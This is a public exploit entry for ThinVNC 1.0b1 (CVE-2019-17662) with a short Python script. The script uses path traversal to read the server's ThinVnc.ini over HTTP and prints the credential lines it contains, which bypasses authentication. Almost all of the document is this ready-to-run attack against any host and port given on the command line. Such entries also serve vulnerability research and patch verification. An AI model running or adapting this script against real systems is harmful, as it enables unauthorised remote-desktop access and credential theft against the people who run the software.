# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass
# Date: 2019-10-17
# Exploit Author: Nikhith Tumamlapalli
# Contributor WarMarX
# Vendor Homepage: https://sourceforge.net/projects/thinvnc/
# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download
# Version: 1.0b1
# Tested on: Windows All Platforms
# CVE : CVE-2019-17662

# Description:
# Authentication Bypass via Arbitrary File Read

#!/usr/bin/python3

import sys
import os
import requests

def exploit(host,port):
    url = "http://" + host +":"+port+"/xyz/../../ThinVnc.ini"
    r = requests.get(url)
    body = r.text
    print(body.splitlines()[2])
    print(body.splitlines()[3])



def main():
    if(len(sys.argv)!=3):
        print("Usage:\n{} <host> <port>\n".format(sys.argv[0]))
        print("Example:\n{} 192.168.0.10 5888")
    else:
        port = sys.argv[2]
        host = sys.argv[1]
        exploit(host,port)

if __name__ == '__main__':
    main()